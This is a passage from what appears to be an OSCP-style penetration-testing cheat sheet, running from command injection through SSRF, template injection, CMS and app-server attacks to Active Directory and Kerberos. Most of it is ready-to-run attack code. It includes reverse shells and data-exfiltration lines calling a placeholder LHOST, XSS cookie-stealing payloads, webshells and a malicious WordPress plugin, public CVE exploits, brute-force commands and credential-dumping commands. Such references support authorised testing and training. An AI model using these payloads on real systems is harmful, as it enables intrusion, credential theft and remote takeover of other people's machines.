127.0.0.1; curl http://LHOST/$(whoami)
127.0.0.1; wget http://LHOST/?data=$(cat /etc/passwd | base64)

# File-based:
127.0.0.1; id > /var/www/html/out.txt
# Then: curl http://$IP/out.txt

# ── FILTER BYPASS TRICKS ──────────────────────────────────────
# Encode payload:
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64
# Execute:
echo BASE64 | base64 -d | bash
# Or URL encode the whole thing
```

</details>

<details>
<summary>🔁 6.6 SSRF — Server-Side Request Forgery</summary>

```bash
# ── BASIC DETECTION ───────────────────────────────────────────
# Start listener: nc -nvlp 80
url=http://LHOST/test
url=http://LHOST:80/test
# If you get connection → SSRF confirmed

# ── INTERNAL PORT SCAN VIA SSRF ───────────────────────────────
ffuf -u "http://$IP/api?url=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Fuzzing/Ports/Common-Ports-TCP.txt \
  -fs 0    # Filter empty responses

# ── LOCALHOST BYPASS ──────────────────────────────────────────
http://127.0.0.1/
http://0.0.0.0/
http://localhost/
http://[::1]/               # IPv6
http://[::]:/               # IPv6
http://0/
http://0.0.0.0:80/
http://127.1/
http://127.0.1/
http://0177.0.0.1/          # Octal
http://2130706433/          # Decimal
http://0x7f000001/          # Hex
http://127.0.0.1.nip.io/    # DNS rebinding

# ── CLOUD METADATA ────────────────────────────────────────────
# AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# GCP:
http://metadata.google.internal/computeMetadata/v1/
# Azure:
http://169.254.169.254/metadata/instance?api-version=2021-01-01

# ── PROTOCOL SMUGGLING ────────────────────────────────────────
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
```

</details>

<details>
<summary>🖋️ 6.7 SSTI — Server-Side Template Injection</summary>

```bash
# ── DETECTION ─────────────────────────────────────────────────
{{7*7}}        # → 49 (Jinja2/Twig)
${7*7}         # → 49 (Freemarker/Velocity)
<%= 7*7 %>     # → 49 (ERB/Ruby)
#{7*7}         # → 49 (Ruby Slim)
*{7*7}         # → 49 (Thymeleaf)
{{7*'7'}}      # → 49 or 7777777 (helps distinguish Jinja2 vs Twig)

# ── JINJA2 (Python/Flask) ─────────────────────────────────────
{{config}}                              # Dump config (may have SECRET_KEY)
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}   # Class enumeration
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Better RCE (find subprocess index):
{{''.__class__.__mro__[1].__subclasses__()}}
# Then find subprocess.Popen index (usually 258-280):
{{ ''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX]('id',shell=True,stdout=-1).communicate()[0].strip() }}
# Or use cyclic approach:
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in x.__name__ %}
    {{x('id',shell=True,stdout=-1).communicate()[0]}}
  {% endif %}
{% endfor %}

# ── TWIG (PHP) ────────────────────────────────────────────────
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# ── FREEMARKER (Java) ─────────────────────────────────────────
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# ── VELOCITY (Java) ───────────────────────────────────────────
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())

# ── ERB (Ruby) ────────────────────────────────────────────────
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
```

</details>

<details>
<summary>🔐 6.8 Authentication Bypasses</summary>

```bash
# ── JWT ATTACKS ───────────────────────────────────────────────
# Decode JWT:
echo "PAYLOAD" | base64 -d    # Middle part (base64url)
# Online: jwt.io

# Alg:none attack:
# Change header: {"alg":"none","typ":"JWT"}
# Remove signature (keep trailing dot)
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=')
print(header.decode() + '.' + payload.decode() + '.')
"

# HS256 → RS256 confusion (if you have public key)
# Brute force weak secret:
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
john --format=HMAC-SHA256 jwt.txt

# ── OAUTH BYPASS ──────────────────────────────────────────────
# Open redirect in redirect_uri
# State parameter not validated

# ── COMMON BYPASS TRICKS ──────────────────────────────────────
# Case manipulation:
/Admin → /admin bypass → /ADMIN
# Add extra slashes:
//admin
/./admin
# Null byte:
/admin%00
# Unicode:
/adm%C0%AFin
# HTTP method:
GET /admin → OPTIONS /admin → POST /admin

# ── IDOR (Insecure Direct Object Reference) ───────────────────
# Change user ID in request:
GET /api/user/1 → /api/user/2
GET /download?file=1 → ?file=2
GET /profile?id=100 → ?id=101
# Horizontal: access other users' same-level data
# Vertical: access higher-privilege data

# ── MASS ASSIGNMENT ───────────────────────────────────────────
# Register: {"username":"user","password":"pass"}
# Try:      {"username":"user","password":"pass","role":"admin","isAdmin":true}
```

</details>

<details>
<summary>🌐 6.9 CMS-Specific Attacks</summary>

```bash
# ── WORDPRESS ─────────────────────────────────────────────────
# Scan:
wpscan --url http://$IP -e u,p,t,vp,vt --api-token TOKEN
# User enum only:
wpscan --url http://$IP -e u
# Brute force:
wpscan --url http://$IP -U users.txt -P rockyou.txt --password-attack wp-login
# Enumerate plugins (aggressive):
wpscan --url http://$IP -e ap --plugins-detection aggressive

# Key paths:
/wp-login.php          # Login
/wp-admin/             # Admin panel
/wp-config.php         # DB credentials (try LFI!)
/xmlrpc.php            # RPC interface (brute force vector)
/wp-json/wp/v2/users   # User enum (unauthenticated)
/wp-content/uploads/   # Uploaded files
/.git/                 # Git repo

# Authenticated RCE (admin access):
# Method 1: Theme editor
# Dashboard → Appearance → Theme Editor → 404.php → Add PHP shell → save
curl "http://$IP/wp-content/themes/THEME/404.php?cmd=id"

# Method 2: Plugin upload // https://github.com/xanhacks/wordpress-rce-plugin/
# Dashboard → Plugins → Add New → Upload Plugin
# Create malicious plugin zip:
mkdir mal_plugin
cat > mal_plugin/mal.php << 'EOF'
<?php
/*
Plugin Name: Mal
*/
system($_GET['cmd']);
EOF
zip -r mal_plugin.zip mal_plugin/
# Upload zip → activate → curl http://$IP/wp-content/plugins/mal_plugin/mal.php?cmd=id

# Method 3: xmlrpc.php brute force + RCE
curl -X POST http://$IP/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# If listMethods works → use wp.getUsersBlogs for brute force

# ── DRUPAL ────────────────────────────────────────────────────
droopescan scan drupal -u http://$IP
# Drupalgeddon2 (CVE-2018-7600):
python3 drupalgeddon2.py http://$IP
# Drupalgeddon3 (CVE-2018-7602):
# Requires authentication
# Shell via PHP filter module:
# Admin → Modules → Enable PHP filter
# Create Basic Page: Body: <?php system($_GET['cmd']); ?> → Text format: PHP code

# ── JOOMLA ────────────────────────────────────────────────────
joomscan --url http://$IP
# Admin path: /administrator
# RCE (admin access):
# Extensions → Templates → Template → index.php → add shell
# Configuration.php via LFI → contains DB password

# ── CONCRETE5 ─────────────────────────────────────────────────
# Admin: /index.php/login
# RCE: System > Permissions > File Manager → upload PHP

# ── TYPO3 ─────────────────────────────────────────────────────
# Admin: /typo3/
# Default: admin:password | admin:admin

# ── STRAPI ────────────────────────────────────────────────────
# Admin: /admin
# CVE-2019-18818: Password reset bypass
# CVE-2019-19609: Authenticated RCE via plugin install
```

</details>

<details>
<summary>☕ 6.10 Application Server Attacks</summary>

```bash
# ── TOMCAT ────────────────────────────────────────────────────
# Default creds to try:
# admin:admin | tomcat:tomcat | admin:tomcat | tomcat:s3cr3t | admin:s3cr3t
# admin:password | tomcat:password | admin:manager

# Find manager path:
gobuster dir -u http://$IP:8080 -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt
# Common: /manager/html | /host-manager/html | /manager/status

# Deploy WAR shell (authenticated):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
# Via curl:
curl -v -u admin:admin -T shell.war "http://$IP:8080/manager/text/deploy?path=/shell"
curl "http://$IP:8080/shell/"
# Via browser: Manager App → Deploy → WAR file to deploy

# CVE-2020-1938 (Ghostcat) — AJP file read/inclusion:
# Port 8009 must be open
python3 Ghostcat-CNVD-2020-10487.py -p 8009 -a $IP
# Default: read /WEB-INF/web.xml

# Tomcat PUT CVE-2017-12617:
curl -X PUT "http://$IP:8080/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>"

# ── JENKINS ───────────────────────────────────────────────────
# Default creds: admin:admin | admin:(blank) | jenkins:jenkins
# Script console: /script (requires admin)
# Groovy RCE:
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"].execute()
println cmd.text
# Or safer:
def cmd = "id"; println cmd.execute().text
# Reverse shell via Groovy:
String host="$LHOST"; int port=$LPORT
String cmd2="bash -c {echo,BASE64}|{base64,-d}|bash"
["bash","-c",cmd2].execute()

# Jenkins CVE-2018-1000861, CVE-2019-10320 etc.
# Check: /jenkins/scriptText?script=...
# Unauthenticated RCE if old version + agent enabled

# ── JBOSS / WILDFLY ───────────────────────────────────────────
# Default: admin:admin | admin:(blank)
# Deploy WAR via /jmx-console or /web-console
# CVE-2015-7501: Java deserialization via JMXInvokerServlet

# ── WEBSPHERE ─────────────────────────────────────────────────
# Admin: /ibm/console
# Default: wsadmin:(blank) | admin:admin
# CVE-2020-4450: Deserialization

# ── GLASSFISH ─────────────────────────────────────────────────
# Admin: https://$IP:4848/
# Default: admin:adminadmin
# Directory traversal: /%c0%ae%c0%ae/..

# ── WEBLOGIC ──────────────────────────────────────────────────
# Admin: http://$IP:7001/console
# Default: weblogic:weblogic | weblogic:welcome1
# CVE-2017-10271, CVE-2019-2725: Deserialization RCE
```

</details>

<details>
<summary>🔓 6.11 XXE, IDOR, XSS, Deserialization</summary>

```bash
# ── XXE ───────────────────────────────────────────────────────
# Basic file read:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# OOB XXE (blind):
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://LHOST/xxe.dtd"> %xxe;]>
# xxe.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?data=%file;'>">
%eval; %exfil;

# Windows path:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>

# SSRF via XXE:
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

# ── JAVA DESERIALIZATION ──────────────────────────────────────
# Tools: ysoserial, URLDNS chain for detection
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.ser
# Check: SerialKiller bypass, URLDNS for blind detection

# ── PHP DESERIALIZATION ───────────────────────────────────────
# Magic methods exploited: __wakeup, __destruct, __toString
# PHPggc tool:
phpggc -l                          # List gadget chains
phpggc Monolog/RCE1 system id
phpggc Laravel/RCE1 system 'id'

# ── XSS → COOKIE THEFT ────────────────────────────────────────
# If XSS → admin panel → can achieve SSRF, file upload, etc.
<script>new Image().src='http://LHOST/?c='+document.cookie</script>
<script>fetch('http://LHOST/?c='+btoa(document.cookie))</script>
# Beef-XSS framework for more advanced attacks
```

</details>

---

## 7. EXPLOITATION — INITIAL ACCESS

<details>
<summary>⚡ 7.1 Quick Win Priority Checklist</summary>

```
TIER 1 — Try in first 10 minutes:
[ ] Anonymous FTP/SMB → read files → find creds/keys
[ ] Default creds on every web app
[ ] Searchsploit exact version match with public exploit
[ ] CVE for exact service version (vsftpd 2.3.4, Apache 2.4.49 etc.)
[ ] robots.txt/sitemap → find /admin /backup
[ ] WordPress → wpscan → brute admin
[ ] EternalBlue if SMB + Windows 7/2008
[ ] Drupalgeddon if Drupal detected

TIER 2 — Common paths:
[ ] SQLi on login forms → admin bypass → file write → shell
[ ] LFI → log poison → RCE
[ ] File upload → webshell
[ ] Exposed .git repo → source code → hardcoded creds
[ ] Sensitive files in SMB shares → creds
[ ] SNMP → process args → passwords
[ ] Config files accessible → DB creds → more access
[ ] xmlrpc.php brute force (WordPress)

TIER 3 — Dig deeper:
[ ] Source code review (extracted from .git or download)
[ ] API enumeration → undocumented endpoints
[ ] IDOR/auth bypass in web app
[ ] XXE in XML input
[ ] SSRF to internal services
[ ] Deserialization in Java/.NET apps

NEVER FORGET:
[ ] Always try creds found on one service against ALL others
[ ] Always enumerate new ports/services discovered after initial access
[ ] Always read every file found — passwords hide everywhere
```

</details>

<details>
<summary>🔑 7.2 CVE Quick Reference — OSCP Most Common</summary>

```bash
# MS17-010 — EternalBlue (SMB, Windows 7 / 2008R2)
nmap --script smb-vuln-ms17-010 $IP
msf: exploit/windows/smb/ms17_010_eternalblue
# Manual: https://github.com/worawit/MS17-010
python3 checker.py $IP
python3 zzz_exploit.py $IP

# MS08-067 — Windows XP / 2003
msf: exploit/windows/smb/ms08_067_netapi
# Manual:
searchsploit ms08-067
# Requires: matching OS version selection

# CVE-2021-41773 + 42013 — Apache 2.4.49/2.4.50 (Path Traversal + RCE)
# Check:
curl http://$IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
curl http://$IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# RCE (if mod_cgi enabled):
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' "http://$IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# CVE-2014-6271 — Shellshock (bash, CGI scripts)
# Detection:
curl -H "User-Agent: () { :; }; echo; /bin/id" http://$IP/cgi-bin/test.cgi
# Test all CGI scripts:
for cgi in test.cgi status.cgi index.cgi admin.cgi; do
  curl -H "User-Agent: () { :; }; echo; /bin/id" http://$IP/cgi-bin/$cgi 2>/dev/null
done
# Reverse shell:
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" http://$IP/cgi-bin/test.cgi

# vsftpd 2.3.4 — Backdoor
nmap --script ftp-vsftpd-backdoor -p21 $IP
# Trigger:
echo -e "USER user:)\nPASS pass" | nc $IP 21; sleep 2; nc $IP 6200

# CVE-2019-0708 — BlueKeep (RDP, Windows 7/2008)
msf: exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# CVE-2021-4034 — PwnKit (pkexec, most Linux distros)
# Compile and run:
searchsploit CVE-2021-4034
make && ./cve-2021-4034

# CVE-2021-3156 — Baron Samedit (sudo < 1.9.5p2)
sudo --version
# Download and compile exploit from github.com/blasty/CVE-2021-3156

# CVE-2021-1675 / CVE-2021-34527 — PrintNightmare
# Requires: Print Spooler running + writable share or SMB
python3 CVE-2021-1675.py domain/user:pass@$IP '\\LHOST\share\evil.dll'

# CVE-2019-14287 — sudo -u#-1 bypass (sudo < 1.8.28)
# If sudoers: user ALL=(ALL,!root) /bin/bash
sudo -u#-1 /bin/bash     # Becomes root!
sudo -u#4294967295 /bin/bash

# CVE-2019-18634 — sudo pwfeedback buffer overflow (sudo < 1.8.31)

# Dirty COW — CVE-2016-5195 (Linux kernel < 4.8.3)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password    # Adds user firefart with pw

# DirtyPipe — CVE-2022-0847 (Linux kernel 5.8-5.16)
# Overwrite SUID binary or /etc/passwd
```

</details>

---

## 8. PASSWORD ATTACKS & CREDENTIAL ABUSE

<details>
<summary>🌐 8.1 Online Brute Force — Complete Guide</summary>

```bash
# ── HYDRA ─────────────────────────────────────────────────────
# SSH:
hydra -l root -P rockyou.txt $IP ssh -t 4 -V
hydra -L users.txt -P rockyou.txt $IP ssh -t 4

# FTP:
hydra -l admin -P rockyou.txt $IP ftp -t 10

# HTTP POST form:
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -V
# Multiple failure strings:
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Wrong:F=Error:F=failed" -V

# HTTP GET basic auth:
hydra -l admin -P rockyou.txt $IP http-get /admin/
hydra -l admin -P rockyou.txt $IP http-get-form "/admin/:F=401"

# HTTPS:
hydra -l admin -P rockyou.txt https-post-form://$IP/login:user=^USER^&pass=^PASS^:F=error

# RDP:
hydra -l administrator -P rockyou.txt rdp://$IP -V
hydra -L users.txt -P rockyou.txt rdp://$IP -V

# SMB:
hydra -l administrator -P rockyou.txt $IP smb -V

# SMTP:
hydra -l admin -P rockyou.txt $IP smtp -V
hydra -l admin@domain.com -P rockyou.txt $IP smtp -V

# POP3:
hydra -l admin -P rockyou.txt $IP pop3 -V

# MySQL:
hydra -l root -P rockyou.txt $IP mysql

# VNC:
hydra -P rockyou.txt $IP vnc -t 1   # Must be -t 1

# WordPress:
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"

# Proxy through Burp (debug):
hydra ... -o /tmp/hydra.txt

# ── MEDUSA ────────────────────────────────────────────────────
medusa -h $IP -u admin -P rockyou.txt -M http -m DIR:/admin -T 10
medusa -h $IP -u admin -P rockyou.txt -M ssh
medusa -h $IP -u admin -P rockyou.txt -M ftp

# ── CRACKMAPEXEC (Windows) ────────────────────────────────────
crackmapexec smb $IP -u admin -P rockyou.txt
crackmapexec ssh $IP -u admin -p rockyou.txt
crackmapexec winrm $IP -u users.txt -p rockyou.txt
# Single password spray:
crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success
# Output: green [+] = valid, red [-] = invalid
```

</details>

<details>
<summary>🔓 8.2 Offline Hash Cracking — Complete Reference</summary>

```bash
# ── IDENTIFY HASH ─────────────────────────────────────────────
hash-identifier "HASH"
hashid "HASH"
# Or: https://hashes.com/en/tools/hash_identifier

# ── HASHCAT MODE TABLE ────────────────────────────────────────
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1000 = NTLM (Windows)
# 3000 = LM (old Windows)
# 500  = MD5crypt ($1$)
# 1800 = SHA512crypt ($6$) — Linux /etc/shadow
# 7400 = sha256crypt ($5$)
# 5800 = Android PIN/Password
# 3200 = bcrypt ($2*$)
# 400  = phpass (WordPress, phpBB)
# 2811 = MyBB, IPB
# 13100 = Kerberos 5 TGS-REP (Kerberoast)
# 18200 = Kerberos 5 AS-REP (ASREPRoast)
# 5600 = NetNTLMv2
# 5500 = NetNTLMv1
# 13000 = RAR5
# 22000 = WPA2 PMK
# 22921 = RSA/DSA/EC/OpenSSH Private Keys
# 9600 = MS Office 2013
# 13400 = KeePass
# 16800 = WPA PMKID

# ── HASHCAT COMMANDS ──────────────────────────────────────────
# Basic:
hashcat -m 1000 hashes.txt rockyou.txt

# With rules (multiply cracking power 10x):
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# tell hashcat that there is username as well inside hash
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt --username

# Attack modes:
hashcat -m 1000 -a 0 hash.txt rockyou.txt           # Wordlist
hashcat -m 1000 -a 1 hash.txt words1.txt words2.txt  # Combinator
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a           # Brute force mask
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d      # Hybrid word+mask
# Mask chars: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all

# Continue session:
hashcat -m 1000 hash.txt rockyou.txt --restore

# Show cracked:
hashcat -m 1000 hash.txt --show

# ── JOHN THE RIPPER ───────────────────────────────────────────
john hash.txt --wordlist=rockyou.txt
john hash.txt --wordlist=rockyou.txt --rules=All
john hash.txt --format=NT --wordlist=rockyou.txt
john hash.txt --show
john hash.txt --show --format=NT
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
# Format conversions (john's *2john tools):
ssh2john id_rsa > id_rsa.hash
zip2john protected.zip > zip.hash
rar2john protected.rar > rar.hash
pdf2john protected.pdf > pdf.hash
keepass2john Database.kdbx > kp.hash
7z2john archive.7z > 7z.hash
office2john document.docx > office.hash
gpg2john private.gpg > gpg.hash
bitlocker2john disk.img > bitlocker.hash
luks2john encrypted.img > luks.hash

# ── UNSHADOW (combine passwd + shadow) ────────────────────────
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# ── WINDOWS HASHES ────────────────────────────────────────────
# SAM + SYSTEM dump → extract:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# Output: user:RID:LM:NTLM:::
# NTLM hash is the last field

# From live system (with admin):
impacket-secretsdump domain/admin:pass@$IP
impacket-secretsdump -just-dc-ntlm domain/admin:pass@$IP   # NTDS only

# ── NTLM RELAY CAPTURE ────────────────────────────────────────
# Responder captures NTLMv2:
responder -I tun0 -wPv
# Hashes saved to: /usr/share/responder/logs/
cat /usr/share/responder/logs/*.txt
hashcat -m 5600 captured_hashes.txt rockyou.txt
```

</details>

<details>
<summary>🔑 8.3 Credential Hunting</summary>

```bash
# ── LINUX CREDENTIAL LOCATIONS ────────────────────────────────
cat /etc/passwd                    # User list
cat /etc/shadow                    # Hashed passwords (need root)
cat /etc/group                     # Groups
cat ~/.bash_history                # Command history (goldmine!)
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
cat ~/.wget-hsts                   # Sites visited
cat ~/.ssh/id_rsa                  # Private SSH key
cat ~/.ssh/authorized_keys         # Public keys
cat ~/.ssh/known_hosts             # Hosts connected to
cat ~/.netrc                       # FTP/HTTP creds
cat /var/www/html/config.php       # Web app creds
cat /var/www/html/wp-config.php    # WordPress DB creds
cat /var/www/html/.env             # Laravel, Django, etc.
cat /opt/*/config*
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password\|db_pass" 2>/dev/null
find / -name "*.py" -readable 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null
find / -name "*.xml" -readable 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# ── WINDOWS CREDENTIAL LOCATIONS ──────────────────────────────
# Registry:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon creds!
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"                    # PuTTY creds
reg query "HKCU\Software\ORL\WinVNC3\Password"                          # VNC password
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"                 # SNMP community

# Files:
type C:\Windows\Panther\Unattend.xml       # Unattended install
type C:\Windows\Panther\Unattended.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep.inf
type C:\inetpub\wwwroot\web.config          # IIS config
type C:\xampp\htdocs\*\config.php
dir /s /b "password.txt" 2>nul
dir /s /b "*pass*" 2>nul
dir /s /b "*cred*" 2>nul
dir /s /b "*vnc*" 2>nul
findstr /si "password" *.txt *.xml *.ini *.conf 2>nul
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini 2>nul

# Credential Manager:
cmdkey /list
# If RDP creds saved:
runas /savedcredentials /user:DOMAIN\admin cmd.exe

# WiFi passwords:
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# SAM (requires SYSTEM):
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# ── GPP PASSWORDS (SYSVOL — CRITICAL) ─────────────────────────
# Files: Groups.xml, Services.xml, Scheduledtasks.xml
# Location: \\DC\SYSVOL\domain\Policies\**\
find / -name "Groups.xml" 2>/dev/null
# Decrypt cpassword:
gpp-decrypt "CPASSWORD"
# PowerShell:
Get-GPPPassword
```

</details>



---

## 9. ACTIVE DIRECTORY — FULL ATTACK CHAIN

<details>
<summary>🗺️ 9.1 AD Attack Flow Overview</summary>

```
PHASE 1: UNAUTHENTICATED
  ├── Enumerate: nmap, crackmapexec, ldapsearch, enum4linux
  ├── Poison: Responder (LLMNR/NBT-NS) → NTLMv2 hashes
  ├── AS-REP Roast: users with no preauth
  └── Password spray: common passwords against all users

PHASE 2: AUTHENTICATED (low-priv user)
  ├── BloodHound: map all paths to DA
  ├── Kerberoast: crack service account hashes
  ├── ACL abuse: check GenericAll, WriteDACL etc.
  ├── Check local admin: Find-LocalAdminAccess
  ├── Enumerate shares: crackmapexec --shares
  └── Check GPP, unattend.xml, scripts in SYSVOL

PHASE 3: LATERAL MOVEMENT
  ├── PtH / PtT / OverPtH
  ├── Spray cracked hashes across all machines
  └── Use local admin to dump LSASS on each box

PHASE 4: DOMAIN ADMIN
  ├── DCSync: dump all domain hashes
  ├── Golden/Silver ticket
  └── Persistence if needed for report
```

</details>

<details>
<summary>🔍 9.2 Unauthenticated Enumeration</summary>

```bash
# ── INITIAL RECON ─────────────────────────────────────────────
# CrackMapExec fingerprint (even without creds):
crackmapexec smb $IP              # Shows: OS, hostname, domain, signing
crackmapexec smb $IP --shares -u '' -p ''   # Null session shares
crackmapexec smb $IP --shares -u 'guest' -p ''

# Enum4linux (null session):
enum4linux -a $IP 2>/dev/null | tee loot/ad/enum4linux.txt

# ── KERBRUTE USER ENUM ────────────────────────────────────────
kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/Names/names.txt --dc $IP
# Save valid users:
kerbrute userenum -d $DOMAIN users.txt --dc $IP -o valid_users.txt

# ── RPC USER ENUM (null session) ──────────────────────────────
rpcclient -U "" -N $IP -c "enumdomusers"
rpcclient -U "" -N $IP -c "querydominfo"
# RID cycling:
for i in $(seq 1 1000); do
  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep "User Name"
done
crackmapexec smb $IP -u '' -p '' --rid-brute | tee loot/ad/rid_cycle.txt

# ── LDAP ANONYMOUS ────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -b "dc=$(echo $DOMAIN | tr '.' ','|sed 's/,/,dc=/g')" 2>/dev/null | tee loot/ad/ldap_anon.txt
# More structured:
ldapdomaindump $IP -o loot/ad/ldapdump 2>/dev/null   # No auth attempt
```

</details>

<details>
<summary>☠️ 9.3 Responder — LLMNR/NBT-NS Poisoning</summary>

```bash
# ── START RESPONDER ───────────────────────────────────────────
responder -I tun0 -wPv
# Flags: -w = WPAD, -P = ProxyAuth, -v = verbose
# Wait for any machine to try to resolve a nonexistent hostname

# ── WHERE TO WAIT ─────────────────────────────────────────────
# Any machine browsing \\ in Explorer
# Any scheduled task trying to reach a share
# Any application trying to reach a hostname
# You can also force it: find a UNC path injection (SQLi, SSRF, etc.)

# Force NTLM auth via SQL:
# MSSQL: EXEC master..xp_dirtree '\\LHOST\share'
# MySQL: LOAD DATA INFILE '\\\\LHOST\\share\\file' ...

# ── CAPTURED HASHES ───────────────────────────────────────────
cat /usr/share/responder/logs/NTLMv2-*
# Format: user::domain:challenge:hash
# Crack:
hashcat -m 5600 loot/hashes/ntlmv2.txt rockyou.txt
hashcat -m 5600 loot/hashes/ntlmv2.txt rockyou.txt -r best64.rule

# ── NTLM RELAY ATTACK ─────────────────────────────────────────
# Condition: SMB signing disabled on target (crackmapexec confirms)
# Step 1: Disable SMB/HTTP in Responder.conf
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
# Step 2: Start relay
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -i         # Interactive SMB
ntlmrelayx.py -tf targets.txt -smb2support -e mal.exe  # Execute payload
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64"  # Command
# Step 3: Start Responder
responder -I tun0 -dwv
```

</details>

<details>
<summary>🎫 9.4 Kerberos Attacks</summary>

```bash
# ── AS-REP ROASTING ───────────────────────────────────────────
# Users with "Do not require Kerberos preauthentication" = vuln
# No creds needed!
GetNPUsers.py $DOMAIN/ -dc-ip $IP -request -no-pass -usersfile valid_users.txt
GetNPUsers.py $DOMAIN/ -dc-ip $IP -request       # Enumerate + get hashes
GetNPUsers.py $DOMAIN/ -dc-ip $IP -request -outputfile asrep_hashes.txt
# From Windows:
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Crack (hashcat -m 18200):
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# ── KERBEROASTING ─────────────────────────────────────────────
# With valid credentials:
GetUserSPNs.py $DOMAIN/user:pass -dc-ip $IP -request
GetUserSPNs.py $DOMAIN/user:pass -dc-ip $IP -request -outputfile kerb_hashes.txt
GetUserSPNs.py $DOMAIN/user -dc-ip $IP -request -no-pass -k  # With ccache
# From Windows:
